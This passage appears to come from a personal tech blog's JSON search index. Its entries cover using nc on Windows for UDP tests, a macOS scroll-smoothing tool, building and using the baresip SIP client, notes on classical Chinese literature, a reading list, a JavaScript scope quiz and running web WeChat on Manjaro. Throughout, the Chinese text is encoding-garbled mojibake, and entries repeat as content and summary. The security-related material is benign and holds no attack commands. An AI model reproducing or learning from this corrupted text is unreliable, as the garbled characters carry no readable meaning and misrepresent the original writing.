åœ¨æŸ¥çœ‹äº†ncçš„å®˜ç½‘ä¹‹åï¼Œå‘ç°ncå®é™…ä¸Šä¹Ÿæä¾›äº†windowsçš„ç¨‹åºï¼Œæœ‰ä¸¤ç§ç‰ˆæœ¬ã€‚\næœ‰GUIç•Œé¢çš„ï¼Œä½¿ç”¨å‹å¥½ï¼Œå®‰è£…åŒ…æ¯”è¾ƒå¤§ https://nmap.org/dist/nmap-7.91-setup.exe ä»…ä»…åœ¨å‘½ä»¤è¡Œä¸‹æ‰§è¡Œï¼Œåˆšå¥½æ»¡è¶³éœ€æ±‚ https://nmap.org/dist/nmap-7.91-win32.zip çœ‹çœ‹å¸¦GUIç•Œé¢çš„\né™„ä»¶ nmap-7.91-win32.zip ","title":"windowsç‰ˆæœ¬ncæ•™ç¨‹ï¼šåœ¨windowsä¸Šåšudpæµ‹è¯•"},{"content":"ç°è±¡ æœ‰æ—¶å€™è½»å¾®æ»šåŠ¨æ»šè½®ï¼Œé¡µé¢ä¸æ»šåŠ¨ï¼Œç„¶åçªç„¶åˆå‘ç”Ÿäº†æ»šåŠ¨ è§£å†³æ–¹æ¡ˆ Mos https://github.com/Caldis/Mos ä¸€ä¸ªç”¨äºåœ¨MacOSä¸Šå¹³æ»‘ä½ çš„é¼ æ ‡æ»šåŠ¨æ•ˆæœçš„å°å·¥å…·, è®©ä½ çš„æ»šè½®çˆ½å¦‚è§¦æ§æ¿ã€‚ ç‰¹æ€§ ç–¯ç‹‚å¹³æ»‘ä½ çš„é¼ æ ‡æ»šåŠ¨æ•ˆæœ æ”¯æŒåˆ†ç¦»è§¦æ§æ¿/é¼ æ ‡äº‹ä»¶, å•ç‹¬ç¿»è½¬é¼ æ ‡æ»šåŠ¨æ–¹å‘ã€‚ æ»šåŠ¨æ›²çº¿çš„è‡ªå®šä¹‰è°ƒæ•´ã€‚ æ”¯æŒåŒºåˆ†åº”ç”¨å¤„ç†, é»‘/ç™½åå•ç³»ç»Ÿã€‚ ç”¨äºç›‘æ§æ»šåŠ¨äº‹ä»¶çš„å›¾å½¢åŒ–å‘ˆç°çª—å£ã€‚ åŸºäº Swift4 æ„å»º å…è´¹ é™„ä»¶ Mos.Versions.3.3.2.dmg ","permalink":"https://wdd.js.org/posts/2021/06/ismran/","summary":"ç°è±¡ æœ‰æ—¶å€™è½»å¾®æ»šåŠ¨æ»šè½®ï¼Œé¡µé¢ä¸æ»šåŠ¨ï¼Œç„¶åçªç„¶åˆå‘ç”Ÿäº†æ»šåŠ¨ è§£å†³æ–¹æ¡ˆ Mos https://github.com/Caldis/Mos ä¸€ä¸ªç”¨äºåœ¨MacOSä¸Šå¹³æ»‘ä½ çš„é¼ æ ‡æ»šåŠ¨æ•ˆæœçš„å°å·¥å…·, è®©ä½ çš„æ»šè½®çˆ½å¦‚è§¦æ§æ¿ã€‚ ç‰¹æ€§ ç–¯ç‹‚å¹³æ»‘ä½ çš„é¼ æ ‡æ»šåŠ¨æ•ˆæœ æ”¯æŒåˆ†ç¦»è§¦æ§æ¿/é¼ æ ‡äº‹ä»¶, å•ç‹¬ç¿»è½¬é¼ æ ‡æ»šåŠ¨æ–¹å‘ã€‚ æ»šåŠ¨æ›²çº¿çš„è‡ªå®šä¹‰è°ƒæ•´ã€‚ æ”¯æŒåŒºåˆ†åº”ç”¨å¤„ç†, é»‘/ç™½åå•ç³»ç»Ÿã€‚ ç”¨äºç›‘æ§æ»šåŠ¨äº‹ä»¶çš„å›¾å½¢åŒ–å‘ˆç°çª—å£ã€‚ åŸºäº Swift4 æ„å»º å…è´¹ é™„ä»¶ Mos.Versions.3.3.2.dmg ","title":"macos é¼ æ ‡æ»šè½®ä¸çµæ•"},{"content":"å®‰è£… å®‰è£…å‰è¦å…ˆå®‰è£…ä¾èµ–\nhttps://github.com/baresip/re https://github.com/baresip/rem openssl git clone https://github.com/baresip/baresip cd baresip make sudo make install æŒ‡ä»¤ /about About box/accept Accept incoming call/answermode Set answer mode/apistate User Agent state/auloop Start audio-loop /auloop_stop Stop audio-loop/auplay Switch audio player/ausrc Switch audio source/callstat Call status/conf_reload Reload config file/config Print configuration/contact_next Set next contact/contact_prev Set previous contact/contacts List contacts/dial .. Dial/dialcontact Dial current contact/hangup Hangup call/help Help menu/insmod Load module/listcalls List active calls/loglevel Log level toggle/main Main loop debug/memstat Memory status/message Message current contact/modules Module debug/netstat Network debug/options Options/play Play audio file/quit Quit/reginfo Registration info/rmmod Unload module/sipstat SIP debug/sysinfo System info/timers Timer debug/uadel Delete User-Agent/uafind Find User-Agent /uanew Create User-Agent/uanext Toggle UAs/uastat UA debug/uuid Print UUID/vidloop Start video-loop /vidloop stop Stop video-loop/vidsrc Switch video source\næ¨¡å— aac Advanced Audio Coding (AAC) audio codecaccount Account loaderalsa ALSA audio driveramr Adaptive Multi-Rate (AMR) audio codecaptx Audio Processing Technology codec (aptX)aubridge Audio bridge moduleaudiounit AudioUnit audio driver for MacOSX/iOSaufile Audio module for using a WAV-file as audio inputauloop Audio-loop test moduleausine Audio sine wave input moduleav1 AV1 video codecavcapture Video source using iOS AVFoundation video captureavcodec Video codec using FFmpeg/libav libavcodecavformat Video source using FFmpeg/libav libavformatb2bua Back-to-Back User-Agent (B2BUA) modulecodec2 Codec2 low bit rate speech codeccons UDP/TCP console UI drivercontact Contacts modulecoreaudio Apple macOS Coreaudio driverctrl_tcp TCP control interface using JSON payloaddebug_cmd Debug commandsdirectfb DirectFB video display moduledshow Windows DirectShow video sourcedtls_srtp DTLS-SRTP end-to-end encryptionebuacip EBU ACIP (Audio Contribution over IP) Profileecho Echo server moduleevdev Linux input driverfakevideo Fake video input/output driverg711 G.711 audio codecg722 G.722 audio codecg7221 G.722.1 audio codecg726 G.726 audio codecgsm GSM audio codecgst Gstreamer audio sourcegst_video Gstreamer video codecgtk GTK+ 2.0 UIgzrtp ZRTP module using GNU ZRTP C++ libraryhttpd HTTP webserver UI-modulei2s I2S (Inter-IC Sound) audio driverice ICE protocol for NAT Traversaljack JACK Audio Connection Kit audio-driverl16 L16 audio codecmenu Interactive menumpa MPA Speech and Audio Codecmulticast Multicast RTP send and receivemqtt MQTT (Message Queue Telemetry Transport) modulemwi Message Waiting Indicationnatpmp NAT Port Mapping Protocol (NAT-PMP) moduleomx OpenMAX IL video display moduleopensles OpenSLES audio driveropus OPUS Interactive audio codecpcp Port Control Protocol (PCP) moduleplc Packet Loss Concealment (PLC) using spandspportaudio Portaudio driverpulse Pulseaudio driverpresence Presence modulertcpsummary RTCP summary modulerst Radio streamer using mpg123sdl Simple DirectMedia Layer 2.0 (SDL) video output driverselfview Video selfview modulesnapshot Save video-stream as PNG imagessndfile Audio dumper using libsndfilesndio Audio driver for OpenBSDspeex_pp Audio pre-processor using libspeexdspsrtp Secure RTP encryption (SDES) using libre SRTP-stackstdio Standard input/output UI driverstun Session Traversal Utilities for NAT (STUN) moduleswscale Video scaling using libswscalesyslog Syslog moduleturn Obtaining Relay Addresses from STUN (TURN) moduleuuid UUID generator and loaderv4l2 Video4Linux2 video sourcev4l2_codec Video4Linux2 video codec module (H264 hardware encoding)vidbridge Video bridge modulevidinfo Video info overlay modulevidloop Video-loop test modulevp8 VP8 video codecvp9 VP9 video codecvumeter Display audio levels in consolewebrtc_aec Acoustic Echo Cancellation (AEC) using WebRTC SDKwincons Console input driver for Windowswinwave Audio driver for Windowsx11 X11 video output driverx11grab X11 grabber video sourcezrtp ZRTP media encryption module\nå‚è€ƒ https://github.com/baresip/baresip ","permalink":"https://wdd.js.org/opensips/tools/baresip/","summary":"å®‰è£… å®‰è£…å‰è¦å…ˆå®‰è£…ä¾èµ–\nhttps://github.com/baresip/re https://github.com/baresip/rem openssl git clone https://github.com/baresip/baresip cd baresip make sudo make install æŒ‡ä»¤ /about About box/accept Accept incoming call/answermode Set answer mode/apistate User Agent state/auloop Start audio-loop /auloop_stop Stop audio-loop/auplay Switch audio player/ausrc Switch audio source/callstat Call status/conf_reload Reload config file/config Print configuration/contact_next Set next contact/contact_prev Set previous contact/contacts List contacts/dial .. Dial/dialcontact Dial current contact/hangup Hangup call/help Help menu/insmod Load module/listcalls List active calls/loglevel Log level toggle/main Main loop debug/memstat Memory status/message Message current contact/modules Module debug/netstat Network debug/options Options/play Play audio file/quit Quit/reginfo Registration info/rmmod Unload module/sipstat SIP debug/sysinfo System info/timers Timer debug/uadel Delete User-Agent/uafind Find User-Agent /uanew Create User-Agent/uanext Toggle UAs/uastat UA debug/uuid Print UUID/vidloop Start video-loop /vidloop stop Stop video-loop/vidsrc Switch video source","title":"baresip éå¸¸å¥½ç”¨çš„ç»ˆç«¯SIP UA"},{"content":"ç¬¬ä¸€è®²ã€€å…³å…³é›é¸ åœ¨æ²³æ´²ã€€â€”â€”å…ˆç§¦ç¥è¯å’Œè¯—æ­Œæ ‡æ³¨(é»„è‰²) - ä½ç½® 129å¥³å¨²ç‚¼çŸ³è¡¥å¤©å¤„ï¼ŒçŸ³ç ´å¤©æƒŠé€—ç§‹é›¨â€ï¼Œç¬¬äºŒè®²ã€€ç™¾å®¶äº‰é¸£å†™æ˜¥ç§‹ã€€â€”â€”å…ˆç§¦æ•£æ–‡æ ‡æ³¨(é»„è‰²) - ä½ç½® 306ä¸ºå·è€…å†³ä¹‹ä½¿å¯¼ï¼Œä¸ºæ°‘è€…å®£ä¹‹ä½¿è¨€ã€‚â€æ ‡æ³¨(é»„è‰²) - ä½ç½® 466ä»–å°±å‘æ„¤åŠªåŠ›ï¼Œä¸€å®šè¦åšä»“åº“é‡Œçš„è€é¼ ã€‚ç¬¬ä¸‰è®²ã€€å¤§é£èµ·å…®äº‘é£æ‰¬ã€€â€”â€”æ±‰æœçš„èµ‹å’Œæ•£æ–‡æ ‡æ³¨(é»„è‰²) - ä½ç½® 538æœ‰ä¸¤ä¸ªæƒ…å†µå¯ä»¥å…æ­»ï¼šä¸€æ˜¯æ‹¿å‡ºå¤§é‡çš„é‡‘é’±èµèº«ï¼›ç¬¬äºŒå°±æ˜¯å—å®«åˆ‘ã€‚æ ‡æ³¨(é»„è‰²) - ä½ç½® 539å«ã€ŠæŠ¥ä»»å®‰ä¹¦ã€‹ï¼šæ ‡æ³¨(é»„è‰²) - ä½ç½® 557äº‹æƒ…ã€‚ã€Šå²è®°ã€‹å†™å®Œä¹‹åï¼Œå¸é©¬è¿å°±ä¸çŸ¥æ‰€ç»ˆäº†ã€‚ç¬¬å…­è®²ã€€ç‹¬å¿µå¤©åœ°ä¹‹æ‚ æ‚ ã€€â€”â€”éš‹ä¸åˆå”æ–‡å­¦æ ‡æ³¨(é»„è‰²) - ä½ç½® 1346ç‹å‹ƒï¼Œä»–åœ¨åˆå”æ—¶ä»£æ˜¯ä¸€ä¸ªéå¸¸æœ‰æ‰åçš„å°‘å¹´ï¼Œä»– 27å²å°±æ­»äº†ã€‚çœŸæ˜¯â€œåƒå¤æ–‡ç« æœªå°½æ‰â€ã€‚ä»–å†™ã€Šæ»•ç‹é˜åºã€‹ï¼Œæ ‡æ³¨(é»„è‰²) - ä½ç½® 1359å°±æ˜¯æŠŠä½ çš„é­é‡æ‹‰åˆ°è·Ÿä»–ç›¸åŒçš„åœ°æ­¥ã€‚è­¬å¦‚è¯´ï¼Œä½ è€ƒè¯•å¾—äº† 65åˆ†ï¼Œä¸é«˜å…´ï¼Œæˆ‘å°±å¯¹ä½ è¯´ï¼šä¸è¦éš¾è¿‡å˜›ï¼Œæˆ‘ä¸è¿‡åªè€ƒ 67åˆ†è€Œå·²ï¼Œå’±ä»¬ä¿©éƒ½å·®ä¸å¤šã€‚ç¬¬ä¸ƒè®²ã€€ç™»é«˜å£®è§‚å¤©åœ°é—´ã€€â€”â€”ç››å”è¯—æ­Œæ ‡æ³¨(é»„è‰²) - ä½ç½® 1406ç§¦æ—¶æ˜æœˆæ±‰æ—¶å…³ï¼Œä¸‡é‡Œé•¿å¾äººæœªè¿˜ã€‚ä½†ä½¿é¾™åŸé£å°†åœ¨ï¼Œä¸æ•™èƒ¡é©¬åº¦é˜´å±±ã€‚â€”â€”ç‹æ˜Œé¾„ã€Šå‡ºå¡äºŒé¦–ã€‹ï¼ˆå…¶ä¸€ï¼‰æ ‡æ³¨(é»„è‰²) - ä½ç½® 1664æ¡ƒèŠ±æ½­æ°´æ·±åƒå°ºï¼Œä¸åŠæ±ªä¼¦é€æˆ‘æƒ…ã€‚ç¬¬å…«è®²ã€€ä¹Œè¡£å··å£å¤•é˜³æ–œã€€â€”â€”ä¸­å”è¯—æ­Œæ ‡æ³¨(é»„è‰²) - ä½ç½® 1809åº§ä¸­æ³£ä¸‹è°æœ€å¤šï¼Œæ±Ÿå·å¸é©¬é’è¡«æ¹¿ã€‚â€æ ‡æ³¨(é»„è‰²) - ä½ç½® 1892åå¹´ç£¨ä¸€å‰‘ï¼Œéœœåˆƒæœªæ›¾è¯•ã€‚ç¬¬ä¹è®²ã€€éœœå¶çº¢äºäºŒæœˆèŠ±ã€€â€”â€”æ™šå”è¯—æ­Œæ ‡æ³¨(é»„è‰²) - ä½ç½® 1906åœè½¦åçˆ±æ«æ—æ™šï¼Œéœœå¶çº¢äºäºŒæœˆèŠ±ã€‚ç¬¬åè®²ã€€å¤§æ±Ÿä¸œå»æµªæ·˜æ²™ã€€â€”â€”ä¸¤å®‹é‡‘å…ƒæ–‡å­¦ä¹¦ç­¾ - ä½ç½® 2168æ ‡æ³¨(é»„è‰²) - ä½ç½® 2509å±±ç›Ÿè™½åœ¨ï¼Œé”¦ä¹¦éš¾æ‰˜ã€‚æ ‡æ³¨(é»„è‰²) - ä½ç½® 2559åŠå›æ›´å°½ä¸€æ¯é…’ï¼Œè¥¿å‡ºé˜³å…³æ— æ•…äººâ€ï¼Œæ ‡æ³¨(é»„è‰²) - ä½ç½® 2560æ¡ƒèŠ±æ½­æ°´æ·±åƒå°ºï¼Œä¸åŠæ±ªä¼¦é€æˆ‘æƒ…â€ï¼Œ\n","permalink":"https://wdd.js.org/posts/2021/06/rml5uy/","summary":"ç¬¬ä¸€è®²ã€€å…³å…³é›é¸ åœ¨æ²³æ´²ã€€â€”â€”å…ˆç§¦ç¥è¯å’Œè¯—æ­Œæ ‡æ³¨(é»„è‰²) - ä½ç½® 129å¥³å¨²ç‚¼çŸ³è¡¥å¤©å¤„ï¼ŒçŸ³ç ´å¤©æƒŠé€—ç§‹é›¨â€ï¼Œç¬¬äºŒè®²ã€€ç™¾å®¶äº‰é¸£å†™æ˜¥ç§‹ã€€â€”â€”å…ˆç§¦æ•£æ–‡æ ‡æ³¨(é»„è‰²) - ä½ç½® 306ä¸ºå·è€…å†³ä¹‹ä½¿å¯¼ï¼Œä¸ºæ°‘è€…å®£ä¹‹ä½¿è¨€ã€‚â€æ ‡æ³¨(é»„è‰²) - ä½ç½® 466ä»–å°±å‘æ„¤åŠªåŠ›ï¼Œä¸€å®šè¦åšä»“åº“é‡Œçš„è€é¼ ã€‚ç¬¬ä¸‰è®²ã€€å¤§é£èµ·å…®äº‘é£æ‰¬ã€€â€”â€”æ±‰æœçš„èµ‹å’Œæ•£æ–‡æ ‡æ³¨(é»„è‰²) - ä½ç½® 538æœ‰ä¸¤ä¸ªæƒ…å†µå¯ä»¥å…æ­»ï¼šä¸€æ˜¯æ‹¿å‡ºå¤§é‡çš„é‡‘é’±èµèº«ï¼›ç¬¬äºŒå°±æ˜¯å—å®«åˆ‘ã€‚æ ‡æ³¨(é»„è‰²) - ä½ç½® 539å«ã€ŠæŠ¥ä»»å®‰ä¹¦ã€‹ï¼šæ ‡æ³¨(é»„è‰²) - ä½ç½® 557äº‹æƒ…ã€‚ã€Šå²è®°ã€‹å†™å®Œä¹‹åï¼Œå¸é©¬è¿å°±ä¸çŸ¥æ‰€ç»ˆäº†ã€‚ç¬¬å…­è®²ã€€ç‹¬å¿µå¤©åœ°ä¹‹æ‚ æ‚ ã€€â€”â€”éš‹ä¸åˆå”æ–‡å­¦æ ‡æ³¨(é»„è‰²) - ä½ç½® 1346ç‹å‹ƒï¼Œä»–åœ¨åˆå”æ—¶ä»£æ˜¯ä¸€ä¸ªéå¸¸æœ‰æ‰åçš„å°‘å¹´ï¼Œä»– 27å²å°±æ­»äº†ã€‚çœŸæ˜¯â€œåƒå¤æ–‡ç« æœªå°½æ‰â€ã€‚ä»–å†™ã€Šæ»•ç‹é˜åºã€‹ï¼Œæ ‡æ³¨(é»„è‰²) - ä½ç½® 1359å°±æ˜¯æŠŠä½ çš„é­é‡æ‹‰åˆ°è·Ÿä»–ç›¸åŒçš„åœ°æ­¥ã€‚è­¬å¦‚è¯´ï¼Œä½ è€ƒè¯•å¾—äº† 65åˆ†ï¼Œä¸é«˜å…´ï¼Œæˆ‘å°±å¯¹ä½ è¯´ï¼šä¸è¦éš¾è¿‡å˜›ï¼Œæˆ‘ä¸è¿‡åªè€ƒ 67åˆ†è€Œå·²ï¼Œå’±ä»¬ä¿©éƒ½å·®ä¸å¤šã€‚ç¬¬ä¸ƒè®²ã€€ç™»é«˜å£®è§‚å¤©åœ°é—´ã€€â€”â€”ç››å”è¯—æ­Œæ ‡æ³¨(é»„è‰²) - ä½ç½® 1406ç§¦æ—¶æ˜æœˆæ±‰æ—¶å…³ï¼Œä¸‡é‡Œé•¿å¾äººæœªè¿˜ã€‚ä½†ä½¿é¾™åŸé£å°†åœ¨ï¼Œä¸æ•™èƒ¡é©¬åº¦é˜´å±±ã€‚â€”â€”ç‹æ˜Œé¾„ã€Šå‡ºå¡äºŒé¦–ã€‹ï¼ˆå…¶ä¸€ï¼‰æ ‡æ³¨(é»„è‰²) - ä½ç½® 1664æ¡ƒèŠ±æ½­æ°´æ·±åƒå°ºï¼Œä¸åŠæ±ªä¼¦é€æˆ‘æƒ…ã€‚ç¬¬å…«è®²ã€€ä¹Œè¡£å··å£å¤•é˜³æ–œã€€â€”â€”ä¸­å”è¯—æ­Œæ ‡æ³¨(é»„è‰²) - ä½ç½® 1809åº§ä¸­æ³£ä¸‹è°æœ€å¤šï¼Œæ±Ÿå·å¸é©¬é’è¡«æ¹¿ã€‚â€æ ‡æ³¨(é»„è‰²) - ä½ç½® 1892åå¹´ç£¨ä¸€å‰‘ï¼Œéœœåˆƒæœªæ›¾è¯•ã€‚ç¬¬ä¹è®²ã€€éœœå¶çº¢äºäºŒæœˆèŠ±ã€€â€”â€”æ™šå”è¯—æ­Œæ ‡æ³¨(é»„è‰²) - ä½ç½® 1906åœè½¦åçˆ±æ«æ—æ™šï¼Œéœœå¶çº¢äºäºŒæœˆèŠ±ã€‚ç¬¬åè®²ã€€å¤§æ±Ÿä¸œå»æµªæ·˜æ²™ã€€â€”â€”ä¸¤å®‹é‡‘å…ƒæ–‡å­¦ä¹¦ç­¾ - ä½ç½® 2168æ ‡æ³¨(é»„è‰²) - ä½ç½® 2509å±±ç›Ÿè™½åœ¨ï¼Œé”¦ä¹¦éš¾æ‰˜ã€‚æ ‡æ³¨(é»„è‰²) - ä½ç½® 2559åŠå›æ›´å°½ä¸€æ¯é…’ï¼Œè¥¿å‡ºé˜³å…³æ— æ•…äººâ€ï¼Œæ ‡æ³¨(é»„è‰²) - ä½ç½® 2560æ¡ƒèŠ±æ½­æ°´æ·±åƒå°ºï¼Œä¸åŠæ±ªä¼¦é€æˆ‘æƒ…â€ï¼Œ","title":"ä¸€æ—¥çœ‹å°½é•¿å®‰èŠ±â€”â€”å¬åŒ—å¤§æ•™æˆç•…è®²ä¸­å›½å¤ä»£æ–‡å­¦"},{"content":"5æœˆä¹¦å•å›é¡¾ ã€Šé²æ»¨é€Šæ¼‚æµã€‹è®° è¯»å®Œ äººåœ¨å­¤ç‹¬çš„æ—¶å€™ï¼Œé€‚åˆè¯»è¿™æœ¬ä¹¦ ã€Šè¢«è®¨åŒçš„å‹‡æ°”ã€‹è¯»åˆ° 69%ï¼Œ å¾ˆæœ‰å¹¸è¯»åˆ°è¿™æœ¬ä¹¦ï¼Œ6æœˆç»§ç»­ ã€Šå›´åŸã€‹è¯»åˆ°21%ï¼Œæˆ‘å¥½å–œæ¬¢é’±è€çš„æ¯”å–»å¥ï¼Œæ€»æ˜¯é‚£ä¹ˆåˆ«å…·ä¸€æ ¼ï¼Œè®©äººè€³ç›®ä¸€æ–° ã€Šä¸€æ—¥çœ‹å°½é•¿å®‰èŠ±ã€‹è¯»åˆ°81%ï¼Œ æˆ‘å–œæ¬¢å”è¯—å®‹è¯ï¼Œå°±åƒæ˜¯å–œæ¬¢ç‰›å¥¶ä¸€æ ·ï¼Œéå¸¸æœ‰è¥å…»ï¼Œåˆè®©äººå›å‘³æ— ç©· ã€Šç‰›æ´¥é€šè¯†è¯»æœ¬ æ•°å­¦ã€‹è¯»å®Œï¼Œå¦‚æœæˆ‘èƒ½æ—©ç‚¹è¯»åˆ°è¿™æœ¬ä¹¦ï¼Œæˆ‘å°±å¾ˆå¯èƒ½å–œæ¬¢ä¸Šæ•°å­¦ã€‚ 6æœˆä¹¦å• ã€Šé³—é±¼çš„æ—…è¡Œã€‹åˆšè¯»åˆ°20% ã€ŠGooglerè½¯ä»¶æµ‹è¯•ä¹‹é“ã€‹åˆšè¯»åˆ°53%ï¼Œ ç‰›é€¼çš„å…¬å¸ï¼Œç‰›é€¼çš„æµ‹è¯• ã€Šè½¯ä»¶æµ‹è¯•ä¹‹é“å¾®è½¯æŠ€æœ¯ä¸“å®¶ç»éªŒæ€»ç»“ã€‹10% ã€Šæ²‰é»˜çš„ç—…äººã€‹1% ã€Šä¸€ä¸ªäººçš„æœåœ£ã€‹0% ã€Šè¯»æ‡‚å‘ç¥¨ã€‹12% ã€Š108ä¸ªè®­ç»ƒè®©ä½ æˆä¸ºæ‰‹æœºæ‘„å½±è¾¾äººã€‹ ã€Šç»æµå­¦é€šè¯†è¯¾ã€‹ ã€Šæ¥šç•™é¦™ä¼ å¥‡ã€‹21% ","permalink":"https://wdd.js.org/posts/2021/06/qpdnp4/","summary":"5æœˆä¹¦å•å›é¡¾ ã€Šé²æ»¨é€Šæ¼‚æµã€‹è®° è¯»å®Œ äººåœ¨å­¤ç‹¬çš„æ—¶å€™ï¼Œé€‚åˆè¯»è¿™æœ¬ä¹¦ ã€Šè¢«è®¨åŒçš„å‹‡æ°”ã€‹è¯»åˆ° 69%ï¼Œ å¾ˆæœ‰å¹¸è¯»åˆ°è¿™æœ¬ä¹¦ï¼Œ6æœˆç»§ç»­ ã€Šå›´åŸã€‹è¯»åˆ°21%ï¼Œæˆ‘å¥½å–œæ¬¢é’±è€çš„æ¯”å–»å¥ï¼Œæ€»æ˜¯é‚£ä¹ˆåˆ«å…·ä¸€æ ¼ï¼Œè®©äººè€³ç›®ä¸€æ–° ã€Šä¸€æ—¥çœ‹å°½é•¿å®‰èŠ±ã€‹è¯»åˆ°81%ï¼Œ æˆ‘å–œæ¬¢å”è¯—å®‹è¯ï¼Œå°±åƒæ˜¯å–œæ¬¢ç‰›å¥¶ä¸€æ ·ï¼Œéå¸¸æœ‰è¥å…»ï¼Œåˆè®©äººå›å‘³æ— ç©· ã€Šç‰›æ´¥é€šè¯†è¯»æœ¬ æ•°å­¦ã€‹è¯»å®Œï¼Œå¦‚æœæˆ‘èƒ½æ—©ç‚¹è¯»åˆ°è¿™æœ¬ä¹¦ï¼Œæˆ‘å°±å¾ˆå¯èƒ½å–œæ¬¢ä¸Šæ•°å­¦ã€‚ 6æœˆä¹¦å• ã€Šé³—é±¼çš„æ—…è¡Œã€‹åˆšè¯»åˆ°20% ã€ŠGooglerè½¯ä»¶æµ‹è¯•ä¹‹é“ã€‹åˆšè¯»åˆ°53%ï¼Œ ç‰›é€¼çš„å…¬å¸ï¼Œç‰›é€¼çš„æµ‹è¯• ã€Šè½¯ä»¶æµ‹è¯•ä¹‹é“å¾®è½¯æŠ€æœ¯ä¸“å®¶ç»éªŒæ€»ç»“ã€‹10% ã€Šæ²‰é»˜çš„ç—…äººã€‹1% ã€Šä¸€ä¸ªäººçš„æœåœ£ã€‹0% ã€Šè¯»æ‡‚å‘ç¥¨ã€‹12% ã€Š108ä¸ªè®­ç»ƒè®©ä½ æˆä¸ºæ‰‹æœºæ‘„å½±è¾¾äººã€‹ ã€Šç»æµå­¦é€šè¯†è¯¾ã€‹ ã€Šæ¥šç•™é¦™ä¼ å¥‡ã€‹21% ","title":"6æœˆä¹¦å•"},{"content":"const a = {} function test1 (a) { a = { name: \u0026#39;wdd\u0026#39; } } function test2 () { test1(a) } function test3 () { console.log(a) } test2() test3() ","permalink":"https://wdd.js.org/fe/js-101-question/","summary":"const a = {} function test1 (a) { a = { name: \u0026#39;wdd\u0026#39; } } function test2 () { test1(a) } function test3 () { console.log(a) } test2() test3() ","title":"Js 101 Question"},{"content":"åœ¨manjaroä¸Šæˆ‘ç”¨çš„wineç‰ˆæœ¬çš„å¾®ä¿¡ï¼Œç„¶è€Œä¿å­˜æ–‡ä»¶æ—¶ï¼Œæ–‡ä»¶æ— æ³•ä¿å­˜åˆ°manjaroä¸­ï¼Œè€Œåªèƒ½ä¿å­˜åˆ°wineé‡Œé¢çš„windowsä¸­ã€‚\nç”¨wineè¿˜æ˜¯å¾ˆéº»çƒ¦çš„ï¼Œäºæ˜¯æˆ‘å°±é€‰æ‹©äº†ç½‘é¡µç‰ˆæœ¬çš„å¾®ä¿¡ã€‚\nå‰æ chromeæµè§ˆå™¨ æ“ä½œæ­¥éª¤: å°†å¾®ä¿¡ç½‘é¡µç‰ˆä¿å­˜ä¸ºä¹¦ç­¾\næ‰“å¼€è°·æ­Œæµè§ˆå™¨çš„ chrome://apps/ è¿™ä¸ªé¡µé¢\nç„¶åå°†å¾®ä¿¡ç½‘é¡µç‰ˆæœ¬çš„çš„ä¹¦ç­¾æ‹–åŠ¨åˆ°è¿™ä¸ªé¡µé¢ï¼Œ æ‹–åŠ¨ç»“æŸåï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º\nåœ¨å¾®ä¿¡çš„å›¾æ ‡ä¸Šå³é”®ï¼Œå‹¾é€‰åœ¨çª—å£æ‰“å¼€\nç„¶åç‚¹å‡»åˆ›å»ºå¿«æ·æ–¹å¼\nç‚¹å‡»åˆ›å»ºå¿«æ·æ–¹å¼åï¼Œä¼šå¼¹å‡ºå¼¹çª—ï¼Œæ˜¾ç¤ºchromeä¼šåœ¨æ¡Œé¢å’Œåº”ç”¨èœå•ä¸­åˆ›å»ºå¿«æ·æ–¹å¼ï¼Œé€‰æ‹©åˆ›å»º\nç„¶åä½ å°±å¯ä»¥åœ¨æ¡Œé¢ä¸Šçœ‹åˆ°å¾®ä¿¡çš„å›¾æ ‡ï¼Œç‚¹å‡»ä¹‹åchromeä¼šå•ç‹¬åˆ›å»ºä¸€ä¸ªçª—å£ï¼Œä½œä¸ºå¾®ä¿¡çš„ä¸»ç•Œé¢\nä½¿ç”¨å¾®ä¿¡ç½‘é¡µç‰ˆæœ¬çš„å¥½å¤„æ˜¯\nå¾ˆæ–¹ä¾¿çš„è®¿é—®Linuxä¸Šçš„æ–‡ä»¶ å¾®ä¿¡é€šçŸ¥ä¹Ÿæ­£å¸¸äº† ","permalink":"https://wdd.js.org/posts/2021/06/sxwh8v/","summary":"åœ¨manjaroä¸Šæˆ‘ç”¨çš„wineç‰ˆæœ¬çš„å¾®ä¿¡ï¼Œç„¶è€Œä¿å­˜æ–‡ä»¶æ—¶ï¼Œæ–‡ä»¶æ— æ³•ä¿å­˜åˆ°manjaroä¸­ï¼Œè€Œåªèƒ½ä¿å­˜åˆ°wineé‡Œé¢çš„windowsä¸­ã€‚\nç”¨wineè¿˜æ˜¯å¾ˆéº»çƒ¦çš„ï¼Œäºæ˜¯æˆ‘å°±é€‰æ‹©äº†ç½‘é¡µç‰ˆæœ¬çš„å¾®ä¿¡ã€‚\nå‰æ chromeæµè§ˆå™¨ æ“ä½œæ­¥éª¤: å°†å¾®ä¿¡ç½‘é¡µç‰ˆä¿å­˜ä¸ºä¹¦ç­¾\næ‰“å¼€è°·æ­Œæµè§ˆå™¨çš„ chrome://apps/ è¿™ä¸ªé¡µé¢\nç„¶åå°†å¾®ä¿¡ç½‘é¡µç‰ˆæœ¬çš„çš„ä¹¦ç­¾æ‹–åŠ¨åˆ°è¿™ä¸ªé¡µé¢ï¼Œ æ‹–åŠ¨ç»“æŸåï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º\nåœ¨å¾®ä¿¡çš„å›¾æ ‡ä¸Šå³é”®ï¼Œå‹¾é€‰åœ¨çª—å£æ‰“å¼€\nç„¶åç‚¹å‡»åˆ›å»ºå¿«æ·æ–¹å¼\nç‚¹å‡»åˆ›å»ºå¿«æ·æ–¹å¼åï¼Œä¼šå¼¹å‡ºå¼¹çª—ï¼Œæ˜¾ç¤ºchromeä¼šåœ¨æ¡Œé¢å’Œåº”ç”¨èœå•ä¸­åˆ›å»ºå¿«æ·æ–¹å¼ï¼Œé€‰æ‹©åˆ›å»º\nç„¶åä½ å°±å¯ä»¥åœ¨æ¡Œé¢ä¸Šçœ‹åˆ°å¾®ä¿¡çš„å›¾æ ‡ï¼Œç‚¹å‡»ä¹‹åchromeä¼šå•ç‹¬åˆ›å»ºä¸€ä¸ªçª—å£ï¼Œä½œä¸ºå¾®ä¿¡çš„ä¸»ç•Œé¢\nä½¿ç”¨å¾®ä¿¡ç½‘é¡µç‰ˆæœ¬çš„å¥½å¤„æ˜¯\nå¾ˆæ–¹ä¾¿çš„è®¿é—®Linuxä¸Šçš„æ–‡ä»¶ å¾®ä¿¡é€šçŸ¥ä¹Ÿæ­£å¸¸äº† 